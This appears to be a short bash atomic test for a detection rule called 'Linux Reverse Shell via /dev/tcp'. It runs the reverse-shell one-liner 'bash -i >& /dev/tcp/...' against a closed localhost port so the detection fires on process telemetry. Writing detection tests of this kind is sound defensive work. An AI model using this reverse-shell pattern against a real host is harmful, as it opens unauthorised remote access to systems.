#!/usr/bin/env bash
# Atomic test — rule a3c5c821-004a-4e52-8684-0f7f9ea0404c
#   "Linux Reverse Shell via /dev/tcp"  (process_creation)
#
# Spawns a shell whose command line carries the /dev/tcp pseudo-device plus a
# stream redirect — the exact tokens the rule keys on. It points at a closed
# local port so nothing actually connects; the connection is refused instantly.
# The detection fires on the process_creation telemetry, not on the network.
set -u
timeout 5 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1' >/dev/null 2>&1 || true
exit 0
